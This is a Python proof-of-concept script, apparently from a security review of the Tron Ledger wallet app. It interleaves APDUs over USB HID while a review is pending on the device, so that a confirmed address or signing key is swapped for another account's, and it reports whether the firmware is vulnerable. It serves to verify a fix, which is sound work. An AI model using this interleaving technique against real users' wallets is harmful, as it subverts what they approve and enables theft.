#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Manual, on-hardware proof of concept for the review-context TOCTOU.

Companion to the automated Speculos suite (tests/test_toctou.py). That suite
relies on the emulator's raw APDU socket to interleave commands; a real Ledger
exposes a single USB HID pipe and ledgerblue's `dongle.exchange()` blocks until
you approve on the device, so nothing can be injected mid-review through the
normal API.

This script splits the HID write and read so the review APDU can be left
pending on screen while a second APDU is pushed on the *same* connection. The
firmware keeps servicing APDUs during its UX loop (that is the bug), so the
injected command is processed immediately and its response comes back before
you have approved anything.

It is INTERACTIVE: you must watch the device screen and press keys on it when
prompted. It only proves the vulnerability if the firmware is the vulnerable
baseline; once the dispatcher rejects APDUs while a review is pending, the
injected command returns 0x6985 (or similar) and the script reports SAFE.

Transport: USB HID only (what `getDongle(True)` returns for a physical
device). The TCP / BLE proxies are not supported here because the injection
needs frame-level access to the HID pipe.

Scenarios
---------
  addr    (default, needs no settings)
      Verify-address for account A is on screen; a non-confirming
      GET_PUBLIC_KEY for account B overwrites the shared publicKeyContext.
      Approving returns account B's key/address.

  keysub  (needs "Sign by hash" enabled in the app settings)
      Sign-by-hash review of hash H (account A) is on screen; a
      SIGN_PERSONAL_MESSAGE first-chunk for account B rewrites the shared
      transactionContext.bip32_path. Approving signs H with account B's key.

Usage
-----
  python3 toctouInterleave.py                       # addr scenario
  python3 toctouInterleave.py --scenario keysub
  python3 toctouInterleave.py --path-a "44'/195'/0'/0/0" \\
                              --path-b "44'/195'/1'/0/0"
"""
import argparse
import hashlib
import sys
import time

from ledgerblue.comm import getDongle
from ledgerblue.ledgerWrapper import unwrapResponseAPDU, wrapCommandAPDU
from eth_keys import KeyAPI

from base import apduMessage, parse_bip32_path

# APDU instructions (see src/handlers/dispatcher.c)
INS_GET_PUBLIC_KEY = 0x02
INS_SIGN = 0x04
INS_SIGN_TXN_HASH = 0x05
INS_SIGN_PERSONAL_MESSAGE = 0x08

# GET_PUBLIC_KEY P1
P1_NON_CONFIRM = 0x00
P1_CONFIRM = 0x01
# SIGN / personal-message P1
P1_FIRST = 0x00
P1_SIGN = 0x10

SW_OK = 0x9000
SW_DENIED = 0x6985

HID_CHANNEL = 0x0101
HID_PACKET = 64


class HidInterleaveChannel:
    """Frame-level HID access allowing several APDUs to be in flight.

    ledgerblue's ``HIDDongleHIDAPI.exchange`` writes a command and then blocks
    reading the response. Here ``send`` and ``receive`` are separate, so a
    review APDU (which will not answer until the user approves) can be left
    pending while another APDU is pushed and its reply collected.
    """

    def __init__(self, dongle):
        # `getDongle(True)` yields a HIDDongleHIDAPI whose `.device` is the
        # underlying hidapi handle.
        self._hid = getattr(dongle, "device", None)
        if self._hid is None or not getattr(dongle, "ledger", False):
            raise SystemExit(
                "This PoC requires a USB HID Ledger device. TCP/BLE proxies "
                "(LEDGER_PROXY_*, LEDGER_BLE_*) are not supported.")

    def send(self, apdu):
        wrapped = wrapCommandAPDU(HID_CHANNEL, bytearray(apdu), HID_PACKET)
        offset = 0
        while offset < len(wrapped):
            frame = bytes(wrapped[offset:offset + HID_PACKET])
            # hidapi expects a leading report-id byte (0x00).
            if self._hid.write(b"\x00" + frame) < 0:
                raise IOError("HID write failed")
            offset += HID_PACKET

    def receive(self, timeout=45.0):
        """Reassemble one response, or None if nothing arrives in `timeout`."""
        self._hid.set_nonblocking(False)
        deadline = time.time() + timeout
        data = b""
        while True:
            remaining_ms = int(max(1.0, (deadline - time.time()) * 1000))
            frame = self._hid.read(65, remaining_ms)
            if frame:
                data += bytes(bytearray(frame))
                response = unwrapResponseAPDU(HID_CHANNEL, bytearray(data),
                                              HID_PACKET)
                if response is not None:
                    status = (response[-2] << 8) | response[-1]
                    return bytes(response[:-2]), status
            if time.time() >= deadline:
                return None


###############################################################################
# APDU builders
###############################################################################
def get_public_key_apdu(path, confirm):
    p1 = P1_CONFIRM if confirm else P1_NON_CONFIRM
    return apduMessage(INS_GET_PUBLIC_KEY, p1, 0x00, parse_bip32_path(path), "")


def sign_txn_hash_apdu(path, digest):
    assert len(digest) == 32
    return apduMessage(INS_SIGN_TXN_HASH, 0x00, 0x00, parse_bip32_path(path),
                       digest.hex())


def personal_message_first_apdu(path, declared_len, chunk):
    """A deliberately-incomplete personal message: announces more bytes than
    are sent, so the handler stores the BIP32 path and returns 0x9000 at once
    without displaying anything."""
    assert len(chunk) < declared_len
    body = declared_len.to_bytes(4, "big").hex() + chunk.hex()
    return apduMessage(INS_SIGN_PERSONAL_MESSAGE, P1_FIRST, 0x00,
                       parse_bip32_path(path), body)


###############################################################################
# Response parsing / helpers
###############################################################################
def parse_get_public_key(data):
    pk_len = data[0]
    public_key = data[1:1 + pk_len]
    addr_len = data[1 + pk_len]
    address = data[2 + pk_len:2 + pk_len + addr_len].decode("ascii")
    return public_key, address


def recover_signer(digest, signature):
    sig = KeyAPI.Signature(signature_bytes=bytes(signature[0:65]))
    return KeyAPI().ecdsa_recover(digest, sig)


def prompt(message):
    input("\n>>> {}\n    Press Enter here once done... ".format(message))


def query_reference_key(dongle, path):
    """Synchronous, plain get-pubkey (no confirmation) for a reference value."""
    data = dongle.exchange(get_public_key_apdu(path, confirm=False))
    return parse_get_public_key(bytes(data))


###############################################################################
# Scenarios
###############################################################################
def run_addr(channel, dongle, path_a, path_b):
    print("== Scenario: address-verification swap ==")
    ref_pk_a, addr_a = query_reference_key(dongle, path_a)
    ref_pk_b, addr_b = query_reference_key(dongle, path_b)
    print("  account A ({}): {}".format(path_a, addr_a))
    print("  account B ({}): {}".format(path_b, addr_b))

    print("\nSending GET_PUBLIC_KEY (confirm) for account A...")
    channel.send(get_public_key_apdu(path_a, confirm=True))
    prompt("Check the device: it should be VERIFYING ACCOUNT A's ADDRESS "
           "({}).\n    Do NOT approve yet.".format(addr_a))

    print("Injecting GET_PUBLIC_KEY (non-confirm) for account B...")
    channel.send(get_public_key_apdu(path_b, confirm=False))
    injected = channel.receive(timeout=10.0)
    if injected is None:
        print("No reply to the injected APDU (device may have queued it).")
    else:
        _, status = injected
        if status != SW_OK:
            print("Injected APDU refused with SW=0x{:04x} -> looks SAFE "
                  "(dispatcher rejected it).".format(status))
            return
        inj_pk, inj_addr = parse_get_public_key(injected[0])
        print("Injected APDU answered 0x9000, address={}".format(inj_addr))

    prompt("Now APPROVE the address on the device.")
    result = channel.receive()
    if result is None:
        print("No final response received; inconclusive.")
        return
    data, status = result
    if status != SW_OK:
        print("Confirmation returned SW=0x{:04x}; inconclusive.".format(status))
        return

    _, returned_addr = parse_get_public_key(data)
    print("\nAddress displayed for approval : {}".format(addr_a))
    print("Address actually returned      : {}".format(returned_addr))
    if returned_addr == addr_b and returned_addr != addr_a:
        print("\n*** VULNERABLE: confirmed A but received B's address. ***")
    elif returned_addr == addr_a:
        print("\nSAFE: returned the address that was reviewed.")
    else:
        print("\nInconclusive: unexpected address returned.")


def run_keysub(channel, dongle, path_a, path_b):
    print("== Scenario: signing-key substitution (needs 'Sign by hash') ==")
    ref_pk_a, addr_a = query_reference_key(dongle, path_a)
    ref_pk_b, addr_b = query_reference_key(dongle, path_b)
    digest = hashlib.sha256(b"tron toctou hardware poc").digest()
    print("  account A ({}): {}".format(path_a, addr_a))
    print("  account B ({}): {}".format(path_b, addr_b))
    print("  hash under review: {}".format(digest.hex()))

    print("\nSending SIGN_TXN_HASH for account A...")
    channel.send(sign_txn_hash_apdu(path_a, digest))
    prompt("Check the device: it should be reviewing a transaction/hash for "
           "account A.\n    Do NOT approve yet.")

    print("Injecting SIGN_PERSONAL_MESSAGE first-chunk for account B...")
    channel.send(
        personal_message_first_apdu(path_b, declared_len=64,
                                    chunk=b"\xaa" * 8))
    injected = channel.receive(timeout=10.0)
    if injected is not None and injected[1] != SW_OK:
        print("Injected APDU refused with SW=0x{:04x} -> looks SAFE.".format(
            injected[1]))
        return
    print("Injected APDU accepted (SW=0x9000); shared path overwritten.")

    prompt("Now APPROVE the transaction on the device.")
    result = channel.receive()
    if result is None:
        print("No final response received; inconclusive.")
        return
    data, status = result
    if status != SW_OK:
        print("Signing returned SW=0x{:04x}; inconclusive.".format(status))
        return

    signer = recover_signer(digest, data)
    signer_pk = signer.to_bytes().hex()
    print("\nExpected signer (reviewed A) : {}".format(ref_pk_a.hex()[2:]))
    print("Substituted signer (B)       : {}".format(ref_pk_b.hex()[2:]))
    print("Actual signer of the hash    : {}".format(signer_pk))
    if signer_pk == ref_pk_b.hex()[2:]:
        print("\n*** VULNERABLE: reviewed A's hash, signed with B's key. ***")
    elif signer_pk == ref_pk_a.hex()[2:]:
        print("\nSAFE: the hash was signed with the reviewed key.")
    else:
        print("\nInconclusive: unexpected signer.")


SCENARIOS = {"addr": run_addr, "keysub": run_keysub}


def main():
    parser = argparse.ArgumentParser(description=__doc__,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--scenario", choices=sorted(SCENARIOS), default="addr")
    parser.add_argument("--path-a", default="44'/195'/0'/0/0",
                        help="reviewed account (default 44'/195'/0'/0/0)")
    parser.add_argument("--path-b", default="44'/195'/1'/0/0",
                        help="injected account (default 44'/195'/1'/0/0)")
    args = parser.parse_args()

    print("-= Tron Ledger =- TOCTOU interleave PoC (HARDWARE, interactive)")
    print("Make sure the Tron app is open and the device is unlocked.\n")

    dongle = getDongle(True)
    try:
        channel = HidInterleaveChannel(dongle)
        SCENARIOS[args.scenario](channel, dongle, args.path_a, args.path_b)
    finally:
        dongle.close()


if __name__ == "__main__":
    sys.exit(main())
